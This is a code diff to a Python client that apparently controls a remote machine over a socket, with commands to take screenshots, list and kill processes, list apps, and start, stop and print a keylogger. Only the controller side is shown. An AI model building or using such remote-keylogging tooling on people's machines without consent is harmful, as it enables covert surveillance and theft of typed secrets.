@@ -11,10 +11,12 @@ CMD_KILL_PROCESS = 'kill_process'
 CMD_START_KEYLOGGER = 'start_keylogger'
 CMD_STOP_KEYLOGGER = 'stop_keylogger'
 CMD_PRINT_KEYLOGGER = 'print_keylogger'
+CMD_VIEW_APPS = 'view_apps'
 
 # FLAGS
 FLAG_FILE_END = 'FILE_END'
 FLAG_PROCESSES_END = 'PROCESSES_END'
+FLAG_APPS_END = 'APPS_END'
 
 # BUFFER
 BUFFER_SIZE = 1024
@@ -55,11 +57,14 @@ class Client:
       print('''Commands: 
       1: Take screenshot
       2: View processes
-      3: Kill process
-      4: Start key logger
-      5: Stop key logger
-      6: Print key logger
-      7: Shutdown''')
+      3: View apps
+      4: Kill process/app
+      5: Start app
+      6: Start process
+      7: Start key logger
+      8: Stop key logger
+      9: Print key logger
+      10: Shutdown''')
       cmd = input('Enter command: ')
       if cmd == '1':
         self.take_screenshot()
@@ -67,15 +72,21 @@ class Client:
       elif cmd == '2':
         self.view_processes()
       elif cmd == '3':
-        pid = input('Enter PID: ')
-        self.kill_process(pid)
+        self.view_apps()
       elif cmd == '4':
-        self.start_keylogger()
+        pid = input('Enter pid: ')
+        self.kill_process(pid)
       elif cmd == '5':
-        self.stop_keylogger()
+        pass
       elif cmd == '6':
-        self.print_keylogger()
+        pass
       elif cmd == '7':
+        self.start_keylogger()
+      elif cmd == '8':
+        self.stop_keylogger()
+      elif cmd == '9':
+        self.print_keylogger()
+      elif cmd == '10':
         self.shutdown()
         break
 
@@ -128,6 +139,17 @@ class Client:
     self.socket.send(CMD_KILL_PROCESS.encode())
     time.sleep(0.01)
     self.socket.send(str(pid).encode())
+  
+  def view_apps(self):
+    self.socket.send(CMD_VIEW_APPS.encode())
+    apps = ""
+    while True:
+      data = self.socket.recv(BUFFER_SIZE)
+      if data == FLAG_APPS_END.encode():
+        break
+      else:
+        apps += data.decode()
+    print(apps)
     
 
 
